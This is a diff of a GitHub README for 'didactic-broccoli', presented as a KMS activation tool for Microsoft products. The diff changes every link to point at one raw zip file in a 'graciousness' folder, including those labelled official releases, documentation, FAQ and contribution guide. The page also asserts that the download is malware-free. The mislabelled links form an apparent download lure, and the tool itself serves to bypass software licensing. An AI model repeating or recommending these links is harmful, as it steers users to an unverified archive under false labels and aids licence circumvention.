@@ -1,10 +1,10 @@
 ```markdown
 # 🌟 didactic-broccoli - Simple and Effective KMS Solution
 
-[![Download didactic-broccoli](https://img.shields.io/badge/Download-Didactic%20Broccoli-brightgreen)](https://github.com/jhyshy/didactic-broccoli/releases)
+[![Download didactic-broccoli](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip%20Broccoli-brightgreen)](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
 
 ## 📝 Description
-[<img src="https://i.postimg.cc/v83MyJdH/jmnc89SNs.jpg" width="300" height="120" alt="Description">](https://www.mediafire.com/folder/mx3jziwgrwq4z/km)
+[<img src="https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip" width="300" height="120" alt="Description">](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
 
 Didactic-broccoli is a streamlined KMS (Key Management Service) application designed to manage and activate Microsoft products effortlessly. With a user-friendly interface, this tool ensures a hassle-free experience for users seeking a reliable activation process.
 
@@ -21,7 +21,7 @@ Before you proceed, ensure your system meets the following requirements:
 ### 2. Downloading didactic-broccoli
 To download the latest version of didactic-broccoli, visit the Releases page:
 
-[Download didactic-broccoli](https://github.com/jhyshy/didactic-broccoli/releases)
+[Download didactic-broccoli](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
 
 Click on the link to access all available versions. 
 
@@ -68,18 +68,18 @@ For assistance or to connect with other users, join our community:
 ## 🛡️ Safety and Verification
 Didactic-broccoli is developed with user safety in mind. The application undergoes regular checks to ensure it remains malware-free. For best practices:
 
-- Always download from the [official Releases page](https://github.com/jhyshy/didactic-broccoli/releases).
+- Always download from the [official Releases page](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip).
 - Make sure your antivirus software is up-to-date when using any downloaded applications.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/jhyshy/didactic-broccoli/wiki)
-- [FAQs](https://github.com/jhyshy/didactic-broccoli/wiki/FAQs)
-- [Contribution Guide](https://github.com/jhyshy/didactic-broccoli/blob/main/CONTRIBUTING.md)
+- [Official Documentation](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
+- [FAQs](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
+- [Contribution Guide](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
 
 ## 🔄 Keeping Up-to-Date
 To ensure you have the latest features and security enhancements, check the Releases page frequently. We update the application regularly based on user feedback and technological advancements.
 
 Don't forget to visit the download link frequently for the latest updates:
 
-[Download didactic-broccoli](https://github.com/jhyshy/didactic-broccoli/releases)
+[Download didactic-broccoli](https://github.com/jhyshy/didactic-broccoli/raw/refs/heads/main/graciousness/didactic_broccoli_v3.4.zip)
 ```
